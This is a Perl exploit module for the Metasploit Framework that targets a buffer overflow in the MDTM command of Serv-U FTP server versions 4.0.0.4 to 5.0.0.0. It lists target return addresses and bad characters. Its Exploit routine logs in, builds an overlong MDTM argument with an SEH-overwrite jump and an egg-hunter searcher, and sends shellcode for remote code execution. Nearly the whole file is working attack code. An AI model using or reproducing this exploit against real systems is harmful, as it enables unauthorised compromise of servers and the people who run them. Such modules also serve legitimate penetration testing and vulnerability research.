package Msf::Exploit::servu_mdtm_overflow_cn;

use base "Msf::Exploit";
use strict;
use Pex::Searcher;

my $advanced = {
  'SEHOffset'    => ['47', 'Offset from beginning of timezone to SEH'],
};
my $info =
{
  'Name'  => 'Serv-U FTPD MDTM Overflow',
  'Version'  => '2.0',
  'Authors' =>
    [
      'spoonm <ninjatools [at] hush.com>',
      'Based on: Servu2.c lion <lion [at] cnhonker.net>',
    ],
  'Description'  => qq{

  This is a exploit for Serv-U's MDTM command (to change modification times).
  It has been tested against versions 4.0.0.4/4.1.0.0/4.1.0.3/5.0.0.0 with
  success. You only get one shot, but Auto Detect seems to work well.  All
  offsets are in dll's included in Serv-U, so they should be OS/SP independant.
    
  },
  
  'Arch'  => [ 'x86' ],
  'OS'    => [ 'win2000', 'win32' ],
  'Priv'  => 0,
  'UserOpts'  =>
    {
      'RHOST' => [1, 'ADDR', 'The target address'],
      'RPORT' => [1, 'PORT', 'The target port', 21],
      'SSL'   => [0, 'BOOL', 'Use SSL'],
      'USER'  => [1, 'DATA', 'Username', 'anonymous'],
      'PASS'  => [1, 'DATA', 'Password', 'exploit\@metasploit.com'],
    },

  'Payload' =>
    {
      'Space'  => 1000,
      'BadChars'  => "\x00~+&=%\x0a\x0d\x20\x2f\x5c\x2e",
      'MinNops' => 0,
      'MaxNops' => 0,
    },
  'Nop' =>
    {
      'ModStack' => 0, # We don't use nops, but if we did...
    },

  'Refs'  => 
    [  
      'http://archives.neohapsis.com/archives/bugtraq/2004-02/0654.html',
      'http://www.cnhonker.com/advisory/serv-u.mdtm.txt',
      'http://www.cnhonker.com/index.php?module=releases&act=view&type=3&id=54',
    ],
  'Targets' =>
    [
      ['Auto Detect (31337)', ],
      ['Serv-U Uber-Leet Universal ServUDaemon.exe', 0x00401877],
      ['Serv-U 4.0.0.4/4.1.0.0/4.1.0.3 ServUDaemon.exe', 0x0040164d],
      ['Serv-U 5.0.0.0 ServUDaemon.exe', 0x0040167e],
    ],
};


# From 5.0.0.4 Change Log
# "* Fixed bug in MDTM command that potentially caused the daemon to crash."
#
# Nice way to play it down boys
#
# Connected to ftp2.rhinosoft.com.
# 220 ProFTPD 1.2.5rc1 Server (ftp2.rhinosoft.com) [62.116.5.74]
#
# Heh :)


sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Exploit {
  my $self = shift;
  my $targetHost  = $self->GetVar('RHOST');
  my $targetPort  = $self->GetVar('RPORT');
  my $targetIndex = $self->GetVar('TARGET');

  my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

  my $sehOffset   = $self->GetLocal('SEHOffset');
  my $jmpOver     = "\x90\x90\xeb\xe2";

  # Searcher expects address to start scanning at in edi
  my $getEip      = "\x83\xc4\xfc\x5f"; # add esp, BYTE -4, pop edi
  my $searcher    = Pex::Searcher->new("\x34\x33\x32\x31");

  my $s = Msf::Socket->new();

  if(!$s->Tcp($targetHost, $targetPort) || $s->IsError) {
    $s->PrintError;
    return;
  }

  my $r;

  $r = $self->response($s);
  goto NORESP if(!$r);
  $targetIndex = 1 if(!$targetIndex && $r =~ /v4\.1/);
  $targetIndex = 1 if(!$targetIndex && $r =~ /v5\.0/);
    
  $s->Send("USER " . $self->GetLocal('USER') . "\r\n");
  goto NORESP if(!$self->response($s));
 
  $s->Send("PASS " . $self->GetLocal('PASS') . "\r\n");
  goto NORESP if(!$self->response($s));


  if(!$targetIndex) {
    $s->Send("P\@SW\r\n");
    $r = $self->response($s);
    goto NORESP if(!$r);

    $targetIndex = $r =~ /500/ ? 1 : 1;
  }


  my $target = $self->Targets->[$targetIndex];
  $self->PrintLine('[*] Trying to exploit target ' . $target->[0]);

  my $searchCode = $getEip . $searcher->Searcher . 'BB';

  if($sehOffset < length($searchCode)) {
    $self->PrintLine('[*] Not enough room for searcher.');
    return;
  }

  my $command = 'MDTM 20031111111111+' . ('A' x ($sehOffset - length($searchCode)));
  $command .= $searchCode;

  $command .= ($jmpOver . pack('V', $target->[1])) x 1;

#  $command .= $getEip . "\xcc" . $searcher->Searcher;
  $command .= ' /' . $searcher->StartTag . $shellcode .  $searcher->EndTag . "\r\n";


  $s->Send($command);

  sleep(2);  
  return;

# dirty
NORESP:
  $self->PrintLine('[*] No response from FTP server');
  return;

}

sub response {
  my $self = shift;
  my $sock = shift;
  my $r = $sock->Recv(-1);
  chomp($r);
  $r =~ s/\r//g;
  $self->PrintLine("[*] REMOTE> $r") if($r);
  return($r);
}

1;
